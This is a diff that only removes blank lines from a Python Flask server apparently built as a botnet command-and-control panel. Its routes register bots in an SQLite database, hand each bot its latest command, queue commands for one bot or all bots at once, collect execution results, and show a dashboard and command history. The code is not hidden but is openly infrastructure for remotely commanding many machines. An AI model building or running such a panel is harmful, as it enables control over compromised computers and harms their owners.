@@ -3,11 +3,8 @@ import sqlite3
 import logging
 
 app = Flask(__name__)
-
 # Logging configuration
 logging.basicConfig(level=logging.INFO)
-
-
 # Initialize the database
 def init_db():
     with sqlite3.connect('bots.db') as conn:
@@ -50,7 +47,6 @@ def init_db():
         """)
         conn.commit()
 
-
 # Helper function for database queries
 def query_db(query, args=(), fetch_one=False):
     with sqlite3.connect('bots.db') as conn:
@@ -59,7 +55,6 @@ def query_db(query, args=(), fetch_one=False):
         if fetch_one:
             return cursor.fetchone()
         return cursor.fetchall()
-
 
 # Route: Register Bot
 @app.route('/register', methods=['POST'])
@@ -88,14 +83,12 @@ def register_bot():
 
     return jsonify({"status": "success", "bot_id": bot_id})
 
-
 # Route: Fetch Command for Specific Bot
 @app.route('/command/<int:bot_id>', methods=['GET'])
 def command(bot_id):
     cmd = query_db("SELECT command FROM commands WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1",
                    (bot_id,), fetch_one=True)
     return cmd[0] if cmd else "No command"
-
 
 # Route: Send Command to a Bot
 @app.route('/send_command', methods=['POST'])
@@ -114,7 +107,6 @@ def send_command():
 
     return jsonify({"status": "success", "bot_id": bot_id, "command": command})
 
-
 # Route: Execute Command for All Bots
 @app.route('/execute_all', methods=['POST'])
 def execute_all():
@@ -131,7 +123,6 @@ def execute_all():
 
     return jsonify({"status": "success", "message": f"Command '{command}' executed for all bots"})
 
-
 # Route: Receive Command Execution Result
 @app.route('/command_result', methods=['POST'])
 def command_result():
@@ -147,13 +138,11 @@ def command_result():
 
     return jsonify({"status": "success"})
 
-
 # Route: View Dashboard with All Bots
 @app.route('/dashboard')
 def dashboard():
     bots = query_db("SELECT * FROM bots ORDER BY last_seen DESC")
     return render_template('dashboard.html', bots=bots)
-
 
 # Route: View Command History of a Bot
 @app.route('/command_history/<int:bot_id>')
